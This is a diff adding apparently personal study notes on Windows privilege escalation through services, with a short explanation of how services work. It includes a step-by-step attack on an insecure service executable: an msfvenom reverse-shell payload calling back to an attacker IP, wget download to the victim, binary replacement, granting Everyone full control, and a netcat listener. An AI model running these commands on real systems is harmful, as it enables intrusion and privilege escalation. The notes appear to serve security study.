@@ -77,3 +77,38 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.51.11 LPORT=LOCA
 -run installer
 C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
 
+--------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Windows Services
+-managed by Service Control Manager (SCM)
+-each service has an associated executable run by SCM when service is started
+-service exe can communicate with SCM
+-shows user account the service runs under
+sc qc
+-services have a Disccretionary Access Control List (DACL)
+-stored at HKLM\SYSTEM\CurrentControlSet\Services\
+
+Insecure Permissions on Service Executable
+sc qc WindowsScheduler
+-list binary path
+icacls [binary path]
+-if everyone group has modify permissions on the service exe - it can be overwritten with payload
+-generate payload
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER IP] LPORT=[PORT] -f exe-service -o rev-svc.exe
+-serve file
+phython3 -m http.server
+-get file on victim computer
+wget http://ATTACKER_IP:PORT/rev-svc.exe -O rev-svc.exe
+-execute service
+cd [binary path]
+move WService.exe WService.exe.bkp
+move rev-svc.exe WService.exe
+icacls WService.exe /grant Everyone:F
+-netcat listener on Attacker machine
+nc -lvp [PORT]
+-stop and restart windows scheduler
+sc stop windowsscheduler
+sc start windowsscheduler
+
+
+
